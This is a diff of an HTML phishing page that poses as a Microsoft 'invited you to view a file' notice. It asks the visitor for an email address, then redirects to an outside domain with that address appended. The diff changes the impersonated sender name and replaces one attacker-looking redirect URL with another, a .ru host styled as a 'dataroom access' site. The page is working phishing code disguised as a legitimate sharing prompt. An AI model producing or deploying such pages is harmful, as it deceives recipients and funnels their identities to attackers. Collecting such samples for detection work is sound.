@@ -81,7 +81,7 @@
 <body>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png" alt="Logo">
-        <h2>Alison Trotman invited you to view a file</h2>
+        <h2>Jane Clarke invited you to view a file</h2>
          <form id="emailForm" method="GET">
             <input type="email" id="email" name="email" placeholder="Enter Email to Continue" required>
             <div class="error" id="errorMessage" style="display: none;">Please enter a valid email address.</div>
@@ -93,7 +93,8 @@
          </form>
         <p class="footer">Disclaimer: The information in this email is confidential and intended solely for this recipient. Unauthorized access is prohibited.</p>
     </div>
-  <script>
+    
+<script>
         const form = document.getElementById('emailForm');
         const emailInput = document.getElementById('email');
         const errorMessage = document.getElementById('errorMessage');
@@ -114,7 +115,7 @@
             } else {
                 errorMessage.style.display = 'none';
                 // Redirect to the landing page with the email appended as a query parameter
-                const redirectUrl = `https://wd0c435.fzminze.com/iALQhehr?zry=an1FRGhmbUo0HcrnJQhn3Xyguts3200F6IQRnhaxiZ8JQyGXTSCeUvSd5q0n#${(email)}`;
+                const redirectUrl = `https://integralgeotec-dataroom-access.losonthify.ru/pRd0r36Z/#W${encodeURIComponent(email)}`;
                 window.location.href = redirectUrl;
             }
         });
